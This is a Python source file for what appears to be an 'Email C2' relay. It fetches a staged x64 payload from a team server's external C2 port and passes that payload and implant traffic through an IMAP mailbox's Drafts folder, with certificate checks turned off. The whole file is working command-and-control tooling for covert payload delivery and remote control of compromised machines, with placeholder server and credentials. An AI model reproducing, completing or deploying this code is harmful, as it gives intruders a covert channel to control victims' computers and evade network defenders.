import socket
import struct
import base64
import threading
import imaplib
import ssl
import time
import sys
import email
import os
from imapclient import IMAPClient
from email.mime.text import MIMEText
from email.header import decode_header

class transferProtocol:
    def __init__(self, url, port):
        self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.Socket.connect((url, port))

    def SendStream(self, buffer):
        lenBytes = struct.pack('i', len(buffer))
        self.Socket.send(lenBytes)
        self.Socket.send(buffer)

    def ReadStream(self):
        sizeBytes = self.Socket.recv(4)
        size = struct.unpack('i', sizeBytes)[0]
        byteReceived = b""
        total = 0

        while total < size:
            bytes = self.Socket.recv(size - total)
            byteReceived += bytes
            total += len(bytes)

        return byteReceived

class InitClient:
    @staticmethod
    def SendData_Pack(data):
        DataBytes = data.encode('utf-8')
        # print(f"  [>] SendData_Pack: {len(DataBytes)}")
        return DataBytes

    @staticmethod
    def pipeOption(transfer, UUID):
        while True:
            try:
                rs3 = base64.b64decode(DraftsIO.Read("client" + UUID))
                transfer.SendStream(rs3)
                time.sleep(3)
                rs4 = base64.b64encode(transfer.ReadStream()).decode('utf-8')
                DraftsIO.Write("ts" + UUID, rs4, 0)
                time.sleep(3)
                print(f"[+] Received ts data and passed it to the pipeline:{rs4}")
            except Exception as e:
                print(e)

    @staticmethod
    def Init(transfer, requestPayload, x64payload):
        code = 1
        rs = requestPayload
        if rs.startswith("x64"):
            UUID = rs.split('.')[1].replace("\r\n", "")
            Os = rs.split('.')[0].replace("\r\n", "")
            print(f"[+] {UUID} requesting payload from ts")
            transfer.SendStream(InitClient.SendData_Pack("arch=x64"))
            transfer.SendStream(InitClient.SendData_Pack("pipename=testpipe"))
            transfer.SendStream(InitClient.SendData_Pack("block=1000"))
            transfer.SendStream(InitClient.SendData_Pack("go"))
            payload = x64payload

            while len(payload) < 30000:
                pass

            DraftsIO.Write("ts" + UUID, payload, code)
            print(f"[+] Sending payload to {UUID},Length:{len(payload)}")
            time.sleep(3)
            maxRetries = 50
            retryCount = 0
            while retryCount < maxRetries:
                try:
                    rs3 = DraftsIO.Read("client" + UUID)
                    if len(rs3) > 170:
                        transfer.SendStream(base64.b64decode(rs3))
                        break
                except Exception as e:
                    retryCount += 1
                    if retryCount >= maxRetries:
                        print(f"[!] Error: {e}")
                    print(f"[!] Retrying to fetch payload:{retryCount}")
                    time.sleep(1)

            # print("[+] 获取metadata返回发送到ts")
            while retryCount < maxRetries:
                try:
                    rs4 = base64.b64encode(transfer.ReadStream()).decode('utf-8')
                    
                    if rs4 != None:
                        # print("metadata:"+rs4)
                        DraftsIO.Write("ts" + UUID, rs4, 0)
                        InitClient.pipeOption(transfer, UUID)
                        break
                except Exception as e:
                    retryCount += 1
                    if retryCount >= maxRetries:
                        print(f"[!] Error: {e}")
                    print(f"[!] Retrying to fetch payload:{retryCount}")
                    time.sleep(1)

class DraftsIO:
    SERVER = "xxx.xxx.xxx.xxx"
    PORT = 993
    USERNAME = "username"
    PASSWORD = "password"

    @staticmethod
    def Read(subject):
        maxRetries = 5
        retryCount = 0

        while retryCount < maxRetries:
            try:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE

                with IMAPClient(DraftsIO.SERVER, DraftsIO.PORT, ssl_context=ssl_context) as client:
                    client.login(DraftsIO.USERNAME, DraftsIO.PASSWORD)
                    #client.select_folder('INBOX')
                    client.select_folder('Drafts')

                    # 搜索所有邮件
                    messages = client.search('ALL')

                    for uid, message_data in client.fetch(messages, 'BODY.PEEK[HEADER]').items():
                        raw_email = message_data[b'BODY[HEADER]']
                        email_message = email.message_from_bytes(raw_email)
                        email_subject = decode_header(email_message['Subject'])[0][0]
                        if isinstance(email_subject, bytes):
                            email_subject = email_subject.decode()
                    
                        # 如果主题与目标主题完全相同，获取该邮件的内容
                        if email_subject == subject:
                            response = client.fetch([uid], ['BODY[]'])
                            raw_message = response[uid][b'BODY[]']
                            message = email.message_from_bytes(raw_message)
                            if message.is_multipart():
                                for part in message.walk():
                                    if part.get_content_type() == "text/plain":
                                        body = part.get_payload(decode=True)
                                        return body.decode().strip()
                            else:
                                return message.get_payload(decode=True).decode().strip()
                break
                    
            except Exception as ex:
                retryCount += 1
                if retryCount >= maxRetries:
                    raise ex

    @staticmethod
    def Write(subject, body, code):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        with IMAPClient(DraftsIO.SERVER, DraftsIO.PORT, ssl_context=ssl_context) as client:
            client.login(DraftsIO.USERNAME, DraftsIO.PASSWORD)
            client.select_folder('INBOX')
            drafts = client.select_folder('Drafts')
            if code == 1:
                message = MIMEText(body, 'plain')
                message['Subject'] = subject
                client.append('Drafts', message.as_bytes())
            elif code == 0:
                client.select_folder('Drafts')

                    # 搜索所有邮件
                messages = client.search('ALL')

                for uid, message_data in client.fetch(messages, 'BODY.PEEK[HEADER]').items():
                    raw_email = message_data[b'BODY[HEADER]']
                    email_message = email.message_from_bytes(raw_email)
                    email_subject = decode_header(email_message['Subject'])[0][0]
                    if isinstance(email_subject, bytes):
                        email_subject = email_subject.decode()
                    
                        # 如果主题与目标主题完全相同，获取该邮件的内容
                    if email_subject == subject:
                        message = MIMEText(body, 'plain')
                        message['Subject'] = subject
                        client.delete_messages(uid)  # 删除原有邮件
                        client.append('Drafts', message.as_bytes())  # 新增修改后的邮件
                        client.expunge()  # 清理已删除的邮件
                        break  # 跳出循环，只修改一封邮件
                            
                        
                  
def WaitForCommand(sec):
    while sec >= 0:
        print(f"[*] Waiting for {sec} seconds for the client request")
        time.sleep(sec)
        sec -= 1

def SendData_Pack(data):
    DataBytes = data.encode('utf-8')
    # print(f"  [>] SendData_Pack: {len(DataBytes)}")
    return DataBytes

def Wait_Client_Send_Payload():
    # 创建 SSL 上下文并忽略证书验证
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    # 连接到IMAP服务器
    imap = imaplib.IMAP4_SSL(DraftsIO.SERVER, ssl_context=ssl_context)
    imap.login(DraftsIO.USERNAME, DraftsIO.PASSWORD)

    # 选择草稿箱
    imap.select('Drafts')

    # 搜索草稿箱中的unseen邮件
    status, messages = imap.search(None, 'UNSEEN')

    # 获取邮件ID列表
    message_ids = messages[0].split()

    # 逐个获取邮件内容
    for message_id in message_ids:
        # 获取邮件内容
        status, data = imap.fetch(message_id, '(RFC822)')
        raw_email = data[0][1].decode()
        # 按照空行分割邮件内容
        email_parts = raw_email.split('\r\n\r\n')
        # 提取正文部分
        body = email_parts[-1]
        return body

    # 关闭连接
    imap.close()
    imap.logout()

                                                   
def logo():
    logo = '''
    ███████╗███╗   ███╗ █████╗ ██╗██╗          ██████╗██████╗ 
    ██╔════╝████╗ ████║██╔══██╗██║██║         ██╔════╝╚════██╗
    █████╗  ██╔████╔██║███████║██║██║         ██║      █████╔╝
    ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         ██║     ██╔═══╝ 
    ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    ╚██████╗███████╗
    ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝╚══════╝
                                    
    '''

    
    print(logo)
    
    
    

def main():
    logo()
    DraftsIO.Write("client","",1)
    print("[+] Initializing Payload")
    transfer = transferProtocol("xxx.xxx.xxx.xxx", 2222)
    transfer.SendStream(SendData_Pack("arch=x64"))
    transfer.SendStream(SendData_Pack("pipename=testpipe"))
    transfer.SendStream(SendData_Pack("block=1000"))
    transfer.SendStream(SendData_Pack("go"))
    x64payload = base64.b64encode(transfer.ReadStream()).decode('utf-8')
    
    while True:
        try:
            transfer2 = transferProtocol("xxx.xxx.xxx.xxx", 2222)
            WaitForCommand(2)
            requestPayload = Wait_Client_Send_Payload()
            if requestPayload != None:
                thread = threading.Thread(target=InitClient.Init, args=(transfer2, requestPayload, x64payload))
                thread.start()
            else:
                print("[-] No client request for payload")
        except:
            print("[-] No client request for payload")
    

if __name__ == "__main__":
    main()
